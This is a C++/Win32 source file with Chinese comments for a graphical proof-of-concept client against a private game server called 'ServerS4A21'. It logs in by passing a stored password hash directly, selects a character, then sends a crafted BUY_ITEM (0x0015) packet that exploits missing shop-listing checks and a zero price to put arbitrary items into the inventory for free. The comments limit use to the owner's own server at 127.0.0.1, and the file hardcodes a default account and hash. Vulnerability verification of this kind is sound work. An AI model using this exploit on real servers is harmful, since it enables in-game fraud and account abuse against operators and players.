// exp_buy_item.cpp
// exp_buy_item 的 C++/Win32 图形化版本(独立 TCP 客户端,不需要 hook/DLL 注入)。
// 用途:验证 ServerS4A21 BUY_ITEM(0x0015) 未校验商品上架关系 + 零价格免费入包漏洞。
// 仅限服务器所有者在自己的环境(默认 127.0.0.1)做漏洞验证。
//
// 流程与 Python 原版一致:
//   banner -> LOGIN(0x0001, seq=1) -> SELECT_CHAR slot=0(0x0004, seq=2) -> 排空同步包
//   -> BUY_ITEM(0x0015, seq=3, body=<iiii> itemId,count,0,0) -> 等 0x0015 ACK
//
// 界面输入(HOST / 端口 / 账号 / 密码哈希 / 物品ID / 数量)对应 Python 版的可变参数,
// 全部有默认值;执行在后台线程进行,日志区实时输出每一步收发情况。

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <algorithm>
#include <cstdint>
#include <cstdarg>
#include <cstdio>
#include <string>
#include <vector>

#include "gameproto.h"

#pragma comment(lib, "ws2_32.lib")

namespace {

constexpr wchar_t kClassName[] = L"A21ExpBuyItemWindow";
constexpr UINT WM_EXP_FINISHED = WM_APP + 1;

constexpr int IDC_HOST = 1001;
constexpr int IDC_PORT = 1002;
constexpr int IDC_MID = 1003;
constexpr int IDC_PWD = 1004;
constexpr int IDC_ITEM = 1005;
constexpr int IDC_COUNT = 1006;
constexpr int IDC_RUN = 1007;
constexpr int IDC_LOG = 1008;

HINSTANCE g_hinst = nullptr;
HWND g_hwnd = nullptr;
HWND g_edHost = nullptr;
HWND g_edPort = nullptr;
HWND g_edMid = nullptr;
HWND g_edPwd = nullptr;
HWND g_edItem = nullptr;
HWND g_edCount = nullptr;
HWND g_btnRun = nullptr;
HWND g_log = nullptr;
bool g_running = false;

struct ExpParams {
    std::wstring host;
    int port;
    std::wstring mid;
    std::wstring pwdHash;
    long itemId;
    long count;
};

// ---------------------------------------------------------------------------
// 日志(跨线程:SendMessage 到 UI 线程)
// ---------------------------------------------------------------------------
void LogLine(const std::wstring& msg) {
    if (!g_log) return;
    wchar_t timebuf[64];
    SYSTEMTIME st;
    GetLocalTime(&st);
    swprintf(timebuf, L"[%02u:%02u:%02u] ", st.wHour, st.wMinute, st.wSecond);
    std::wstring line = std::wstring(timebuf) + msg + L"\r\n";
    SendMessageW(g_log, EM_SETSEL, static_cast<WPARAM>(-1), static_cast<WPARAM>(-1));
    SendMessageW(g_log, EM_REPLACESEL, FALSE, reinterpret_cast<LPARAM>(line.c_str()));
}

void LogFmt(const wchar_t* fmt, ...) {
    wchar_t buf[2048];
    va_list ap;
    va_start(ap, fmt);
    _vsnwprintf_s(buf, 2048, _TRUNCATE, fmt, ap);
    va_end(ap);
    LogLine(buf);
}

void LogHex(const char* prefix, const std::vector<uint8_t>& data, size_t maxBytes = 64) {
    std::wstring hex;
    size_t n = (std::min)(data.size(), maxBytes);
    wchar_t tmp[4];
    for (size_t i = 0; i < n; ++i) {
        swprintf(tmp, L"%02X", data[i]);
        hex += tmp;
    }
    if (data.size() > n) hex += L"...";
    LogFmt(L"%s %s", prefix, hex.c_str());
}

// ---------------------------------------------------------------------------
// 协议辅助(与 Python 版逐字节一致)
// ---------------------------------------------------------------------------
// dstr: <i 字符串长度(ASCII)> + 字符串字节
std::vector<uint8_t> DStr(const std::string& s) {
    std::vector<uint8_t> out;
    uint32_t len = static_cast<uint32_t>(s.size());
    for (int i = 0; i < 4; ++i) out.push_back(static_cast<uint8_t>((len >> (8 * i)) & 0xFF));
    out.insert(out.end(), s.begin(), s.end());
    return out;
}

bool SendAll(SOCKET s, const std::vector<uint8_t>& data) {
    size_t off = 0;
    while (off < data.size()) {
        int n = send(s, reinterpret_cast<const char*>(data.data() + off),
                     static_cast<int>(data.size() - off), 0);
        if (n <= 0) return false;
        off += static_cast<size_t>(n);
    }
    return true;
}

// 收包直到静默:第一次等待 firstMs,之后每次收到数据把超时缩到 idleMs(对齐 Python recv_once)。
bool RecvQuiet(SOCKET s, std::vector<uint8_t>& out, int firstMs, int idleMs) {
    out.clear();
    int timeoutMs = firstMs;
    char buf[65536];
    while (true) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(s, &fds);
        timeval tv;
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        int r = select(0, &fds, nullptr, nullptr, &tv);
        if (r <= 0) break;  // 超时或出错:视为本次分包结束
        int n = recv(s, buf, sizeof(buf), 0);
        if (n <= 0) break;
        out.insert(out.end(), buf, buf + n);
        timeoutMs = idleMs;
    }
    return !out.empty();
}

// ---------------------------------------------------------------------------
// PoC 流程
// ---------------------------------------------------------------------------
DWORD WINAPI ExpThread(LPVOID param) {
    auto* p = static_cast<ExpParams*>(param);
    ExpParams prm = *p;
    delete p;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    constexpr uint16_t T_LOGIN = 0x0001;
    constexpr uint16_t T_SELECT_CHAR = 0x0004;
    constexpr uint16_t T_BUY_ITEM = 0x0015;

    LogFmt(L"[*] 目标 %s:%d  物品 0x%lX x%ld  账号 %s",
           prm.host.c_str(), prm.port, prm.itemId, prm.count, prm.mid.c_str());

    std::string hostA(prm.host.begin(), prm.host.end());
    std::string midA(prm.mid.begin(), prm.mid.end());
    std::string pwdA(prm.pwdHash.begin(), prm.pwdHash.end());

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<u_short>(prm.port));
    if (InetPtonA(AF_INET, hostA.c_str(), &addr.sin_addr) != 1) {
        LogLine(L"[!] HOST 解析失败(需要 IPv4 地址,如 127.0.0.1)");
        PostMessageW(g_hwnd, WM_EXP_FINISHED, 0, 0);
        return 0;
    }

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        LogLine(L"[!] socket() 创建失败");
        PostMessageW(g_hwnd, WM_EXP_FINISHED, 0, 0);
        return 0;
    }

    // create_connection(timeout=5):先设 5 秒发送超时兜底
    DWORD sendTimeout = 5000;
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, reinterpret_cast<const char*>(&sendTimeout),
               sizeof(sendTimeout));

    if (connect(s, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) != 0) {
        LogFmt(L"[!] 连接失败 WSAGetLastError=%d", WSAGetLastError());
        closesocket(s);
        PostMessageW(g_hwnd, WM_EXP_FINISHED, 0, 0);
        return 0;
    }

    std::vector<uint8_t> r;

    // banner:服务端先推 initial notice
    RecvQuiet(s, r, 3000, 600);
    LogFmt(L"[<-] banner %zuB", r.size());

    // 1) 登录:直接传存储的 passwordHash(pass-the-hash,服务端做字符串比较)
    std::vector<uint8_t> loginBody = DStr(midA);
    {
        std::vector<uint8_t> pwd = DStr(pwdA);
        loginBody.insert(loginBody.end(), pwd.begin(), pwd.end());
    }
    if (!SendAll(s, proto::game_frame(T_LOGIN, loginBody, 1))) {
        LogLine(L"[!] 登录帧发送失败");
        closesocket(s);
        PostMessageW(g_hwnd, WM_EXP_FINISHED, 0, 0);
        return 0;
    }
    bool got = RecvQuiet(s, r, 3000, 600);
    LogFmt(L"[<-] login ack %zuB  %s", r.size(), got ? L"OK" : L"TIMEOUT(继续尝试)");

    // 2) 选角 slot=0 —— 服务端会推大量同步包
    {
        std::vector<uint8_t> body = {0x00, 0x00};  // struct.pack("<H", 0)
        SendAll(s, proto::game_frame(T_SELECT_CHAR, body, 2));
    }
    RecvQuiet(s, r, 4000, 600);
    LogFmt(L"[<-] select ack %zuB", r.size());
    Sleep(1000);
    RecvQuiet(s, r, 1000, 600);  // 排空剩余同步包

    // 3) BUY_ITEM:itemId 客户端任意指定;未上架物品 PVF Price=0 -> goldCost=0 -> 直接入包
    {
        auto body = proto::make_body(static_cast<int32_t>(prm.itemId),
                                     static_cast<int32_t>(prm.count));
        SendAll(s, proto::game_frame(T_BUY_ITEM, body, 3));
    }
    got = RecvQuiet(s, r, 3000, 600);
    LogFmt(L"[<-] buy ack %zuB", r.size());
    if (got) LogHex(L"      hex:", r, 64);

    bool ok = got && r.size() >= 3 && r[0] == 0x01 && r[1] == 0x15 && r[2] == 0x00;
    LogLine(ok ? L"[!] 0x0015 ACK 收到——用下方 SQL 复核入包"
               : L"[x] 0x0015 ACK 未收到");

    LogFmt(L"\r\n[复核 SQL](只读查询):\r\n"
           L"  sqlite3 'file:/home/ubuntu/.local/state/servers4a21/data/inventory.db?mode=ro' "
           L"\"SELECT created_at,action_name,slot_index,item_id,count_delta "
           L"FROM inventory_audit_log WHERE item_id=%ld ORDER BY audit_id DESC LIMIT 5;\"\r\n"
           L"  grep 'BUY_ITEM' ~/.local/state/servers4a21/log/server.log | tail -5",
           prm.itemId);

    closesocket(s);
    PostMessageW(g_hwnd, WM_EXP_FINISHED, 0, 0);
    return 0;
}

// ---------------------------------------------------------------------------
// 界面
// ---------------------------------------------------------------------------
long GetEditInt(HWND edit, long defValue) {
    wchar_t buf[64] = {0};
    GetWindowTextW(edit, buf, 63);
    wchar_t* end = nullptr;
    long v = wcstol(buf, &end, 0);  // base 0:支持 0x 前缀
    return (end && end != buf) ? v : defValue;
}

std::wstring GetEditText(HWND edit) {
    wchar_t buf[256] = {0};
    GetWindowTextW(edit, buf, 255);
    return buf;
}

void CreateControls(HWND hwnd) {
    HFONT font = static_cast<HFONT>(GetStockObject(DEFAULT_GUI_FONT));
    auto label = [&](int x, int y, int w, const wchar_t* text) {
        HWND h = CreateWindowExW(0, L"STATIC", text, WS_CHILD | WS_VISIBLE,
                                 x, y, w, 18, hwnd, nullptr, g_hinst, nullptr);
        SendMessageW(h, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
    };
    auto edit = [&](int x, int y, int w, const wchar_t* def, int id) {
        HWND h = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", def,
                                 WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                                 x, y, w, 22, hwnd, reinterpret_cast<HMENU>(id),
                                 g_hinst, nullptr);
        SendMessageW(h, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
        return h;
    };

    label(10, 15, 45, L"HOST:");
    g_edHost = edit(60, 12, 130, L"127.0.0.1", IDC_HOST);
    label(200, 15, 45, L"端口:");
    g_edPort = edit(245, 12, 60, L"10011", IDC_PORT);

    label(320, 15, 40, L"账号:");
    g_edMid = edit(360, 12, 100, L"wsw123", IDC_MID);
    label(470, 15, 80, L"密码哈希:");
    g_edPwd = edit(550, 12, 180, L"9a01adb03d863718c3e8c9c4c1821965", IDC_PWD);

    label(10, 47, 55, L"物品ID:");
    g_edItem = edit(60, 44, 100, L"29692", IDC_ITEM);
    label(170, 47, 45, L"数量:");
    g_edCount = edit(215, 44, 60, L"3", IDC_COUNT);

    g_btnRun = CreateWindowExW(0, L"BUTTON", L"执行 PoC",
                               WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                               300, 42, 100, 26, hwnd,
                               reinterpret_cast<HMENU>(IDC_RUN), g_hinst, nullptr);
    SendMessageW(g_btnRun, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);

    HWND hint = CreateWindowExW(
        0, L"STATIC",
        L"BUY_ITEM(0x0015) 未校验上架关系 + 零价格入包验证 | 流程: banner→登录(seq=1)→选角(seq=2)→购买(seq=3)",
        WS_CHILD | WS_VISIBLE, 10, 74, 720, 18, hwnd, nullptr, g_hinst, nullptr);
    SendMessageW(hint, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);

    g_log = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE |
                                ES_READONLY | ES_AUTOVSCROLL,
                            10, 96, 720, 330, hwnd,
                            reinterpret_cast<HMENU>(IDC_LOG), g_hinst, nullptr);
    SendMessageW(g_log, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
}

void RunExp() {
    if (g_running) return;
    auto* p = new ExpParams{
        GetEditText(g_edHost),
        static_cast<int>(GetEditInt(g_edPort, 10011)),
        GetEditText(g_edMid),
        GetEditText(g_edPwd),
        GetEditInt(g_edItem, 29692),
        GetEditInt(g_edCount, 3),
    };
    if (p->host.empty() || p->mid.empty() || p->pwdHash.empty()) {
        LogLine(L"[!] HOST / 账号 / 密码哈希 不能为空。");
        delete p;
        return;
    }
    g_running = true;
    EnableWindow(g_btnRun, FALSE);
    HANDLE t = CreateThread(nullptr, 0, ExpThread, p, 0, nullptr);
    if (t) {
        CloseHandle(t);
    } else {
        g_running = false;
        EnableWindow(g_btnRun, TRUE);
        delete p;
        LogLine(L"[!] 无法创建工作线程。");
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE:
            CreateControls(hwnd);
            LogLine(L"就绪。默认目标 127.0.0.1:10011,物品 29692 x3,账号 wsw123。");
            LogLine(L"仅限在你自己的服务器环境做漏洞验证。");
            return 0;
        case WM_COMMAND:
            if (LOWORD(wp) == IDC_RUN && HIWORD(wp) == BN_CLICKED)
                RunExp();
            return 0;
        case WM_EXP_FINISHED:
            g_running = false;
            EnableWindow(g_btnRun, TRUE);
            return 0;
        case WM_CLOSE:
            DestroyWindow(hwnd);
            return 0;
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

}  // namespace

int APIENTRY wWinMain(HINSTANCE hinst, HINSTANCE, LPWSTR, int showCmd) {
    g_hinst = hinst;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    WNDCLASSEXW wc;
    wc.cbSize = sizeof(wc);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hinst;
    wc.hIcon = LoadIconW(nullptr, IDI_APPLICATION);
    wc.hCursor = LoadCursorW(nullptr, IDC_ARROW);
    wc.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_WINDOW + 1);
    wc.lpszMenuName = nullptr;
    wc.lpszClassName = kClassName;
    wc.hIconSm = LoadIconW(nullptr, IDI_APPLICATION);
    if (!RegisterClassExW(&wc)) return 1;

    g_hwnd = CreateWindowExW(0, kClassName, L"exp_buy_item — BUY_ITEM PoC 客户端 (A21)",
                             WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                             CW_USEDEFAULT, CW_USEDEFAULT, 756, 480,
                             nullptr, nullptr, hinst, nullptr);
    if (!g_hwnd) return 1;

    ShowWindow(g_hwnd, showCmd);
    UpdateWindow(g_hwnd);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    WSACleanup();
    return static_cast<int>(msg.wParam);
}
